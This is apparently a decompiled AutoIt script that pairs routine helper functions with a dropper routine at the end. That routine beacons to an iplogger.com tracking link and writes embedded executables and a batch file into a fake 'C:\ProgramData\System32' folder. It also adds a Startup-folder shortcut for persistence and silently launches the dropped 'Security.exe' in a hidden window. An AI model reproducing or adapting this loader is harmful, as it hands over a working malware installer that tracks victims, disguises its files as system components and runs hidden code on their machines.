	Return BitAND($a_r[0], 32768) <> 0
EndFunc

Func _versioncompare($sversion1, $sversion2)
	If $sversion1 = $sversion2 Then Return 0
	Local $ssubversion1 = "", $ssubversion2 = ""
	If StringIsAlpha(StringRight($sversion1, 1)) Then
		$ssubversion1 = StringRight($sversion1, 1)
		$sversion1 = StringTrimRight($sversion1, 1)
	EndIf
	If StringIsAlpha(StringRight($sversion2, 1)) Then
		$ssubversion2 = StringRight($sversion2, 1)
		$sversion2 = StringTrimRight($sversion2, 1)
	EndIf
	Local $aversion1 = StringSplit($sversion1, ".,"), $aversion2 = StringSplit($sversion2, ".,")
	Local $ipartdifference = ($aversion1[0] - $aversion2[0])
	If $ipartdifference < 0 Then
		ReDim $aversion1[UBound($aversion2)]
		$aversion1[0] = UBound($aversion1) - 1
		For $i = (UBound($aversion1) - Abs($ipartdifference)) To $aversion1[0]
			$aversion1[$i] = "0"
		Next
	ElseIf $ipartdifference > 0 Then
		ReDim $aversion2[UBound($aversion1)]
		$aversion2[0] = UBound($aversion2) - 1
		For $i = (UBound($aversion2) - Abs($ipartdifference)) To $aversion2[0]
			$aversion2[$i] = "0"
		Next
	EndIf
	For $i = 1 To $aversion1[0]
		If StringIsDigit($aversion1[$i]) AND StringIsDigit($aversion2[$i]) Then
			If Number($aversion1[$i]) > Number($aversion2[$i]) Then
				Return SetExtended(2, 1)
			ElseIf Number($aversion1[$i]) < Number($aversion2[$i]) Then
				Return SetExtended(2, -1)
			ElseIf $i = $aversion1[0] Then
				If $ssubversion1 > $ssubversion2 Then
					Return SetExtended(3, 1)
				ElseIf $ssubversion1 < $ssubversion2 Then
					Return SetExtended(3, -1)
				EndIf
			EndIf
		Else
			If $aversion1[$i] > $aversion2[$i] Then
				Return SetExtended(1, 1)
			ElseIf $aversion1[$i] < $aversion2[$i] Then
				Return SetExtended(1, -1)
			EndIf
		EndIf
	Next
	Return SetExtended(Abs($ipartdifference), 0)
EndFunc

Func __misc_getdc($hwnd)
	Local $aresult = DllCall("user32.dll", "handle", "GetDC", "hwnd", $hwnd)
	If @error OR NOT $aresult[0] Then Return SetError(1, _winapi_getlasterror(), 0)
	Return $aresult[0]
EndFunc

Func __misc_getdevicecaps($hdc, $iindex)
	Local $aresult = DllCall("gdi32.dll", "int", "GetDeviceCaps", "handle", $hdc, "int", $iindex)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func __misc_releasedc($hwnd, $hdc)
	Local $aresult = DllCall("user32.dll", "int", "ReleaseDC", "hwnd", $hwnd, "handle", $hdc)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0] <> 0
EndFunc

AutoItSetOption("TrayAutoPause", 0)
If _singleton("test", 1) = 0 Then
	TrayTip("AutoIt", "Error", 1)
	Sleep(2000)
	TrayTip("clears any tray tip", "", 0)
	Exit
EndIf
#Region
#EndRegion
$ohttp = ObjCreate("winhttp.winhttprequest.5.1")
$ohttp.open("GET", "https://iplogger.com/167hN6", False)
$ohttp.send()
DirCreate("C:\ProgramData\System32")
$b = True
If $b = True Then FileInstall("C:\Users\PC\Desktop\sukaSE\qqq\1.bat", "C:\ProgramData\System32\1.bat", 1)
If @OSArch = "X86" Then
	If $b = True Then FileInstall("C:\Users\PC\Desktop\sukaSE\qqq\system32.exe", "C:\ProgramData\System32\system.exe", 1)
	If $b = True Then FileInstall("C:\Users\PC\Desktop\sukaSE\qqq\Security32.exe", "C:\ProgramData\System32\Security.exe", 1)
ElseIf @OSArch = "X64" Then
	If $b = True Then FileInstall("C:\Users\PC\Desktop\sukaSE\qqq\system.exe", "C:\ProgramData\System32\system.exe", 1)
	If $b = True Then FileInstall("C:\Users\PC\Desktop\sukaSE\qqq\Security.exe", "C:\ProgramData\System32\Security.exe", 1)
EndIf
FileCreateShortcut("C:\ProgramData\System32\Security.exe", @StartupDir & "\" & "Security" & ".lnk")
Run(@ComSpec & " /c start " & "C:\ProgramData\System32\Security.exe", "", @SW_HIDE)
